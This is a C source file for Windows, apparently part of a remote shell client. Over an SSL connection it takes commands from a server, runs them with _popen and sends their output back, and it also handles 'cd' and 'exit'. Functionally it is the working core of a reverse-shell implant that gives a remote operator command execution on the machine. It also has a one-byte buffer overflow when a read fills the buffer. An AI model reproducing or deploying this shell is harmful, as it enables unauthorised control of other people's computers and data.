#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <Shlobj.h>

#include "shell.h"
#include "utils.h"

void send_cwd(SSL *ssl);
bool change_directory(const char *dir);

void SSL_shell(SSL *ssl)
{
    char buffer[1024];
    while (1)
    {
        send_cwd(ssl);

        int bytesRead = SSL_read(ssl, buffer, sizeof(buffer));
        if (bytesRead <= 0)
        {
            fprintf(stderr, "Connection closed by server\n");
            break;
        }

        buffer[bytesRead] = '\0';
        printf("Received command: %s\n", buffer);

        if (strncmp(buffer, "exit", 4) == 0 || strncmp(buffer, "quit", 4) == 0)
        {
            printf("Shutting down");
            break;
        }

        if (strncmp(buffer, "cd", 2) == 0)
        {
            char **words = NULL;
            int wordCount = 0;
            if (split_command(buffer, &words, &wordCount))
            {
                fprintf(stderr, "Tokenization error\n");
                SSL_write(ssl, "Tokenization error\n", strlen("tokenization error\n"));
                continue;
            }

            if (!change_directory(words[1]))
            {
                SSL_write(ssl, "Client could not change cwd\n", strlen("Client could not change cwd\n"));
            }
            cleanup_argarray(&words, &wordCount);
            continue;
        }

        // get stderr as well
        if (strlen(buffer) + strlen(" 2>&1") < sizeof(buffer))
        {
            strcat(buffer, " 2>&1");
        }

        FILE *fp = _popen(buffer, "r");
        if (fp == NULL)
        {
            fprintf(stderr, "Error executing command\n");
            return;
        }

        while (fgets(buffer, sizeof(buffer), fp) != NULL)
        {
            SSL_write(ssl, buffer, strlen(buffer));
        }

        _pclose(fp);
    }
}

void send_cwd(SSL *ssl)
{
    char path[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, path);
    // check if there is enoug space to add "> "
    if (strlen(path) + strlen("> ") < sizeof(path))
    {
        strcat(path, "> ");
    }
    SSL_write(ssl, path, strlen(path));
}

bool change_directory(const char *dir)
{
    char path[MAX_PATH];
    // if they only typed "cd"
    if (dir == NULL)
    {
        if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK)
        {
            if (SetCurrentDirectoryA(path))
            {
                return true;
            }
        }
        return false;
    }

    // Change directory - works with relative and absolute
    if (SetCurrentDirectoryA(dir))
    {
        return true;
    }
    return false;
}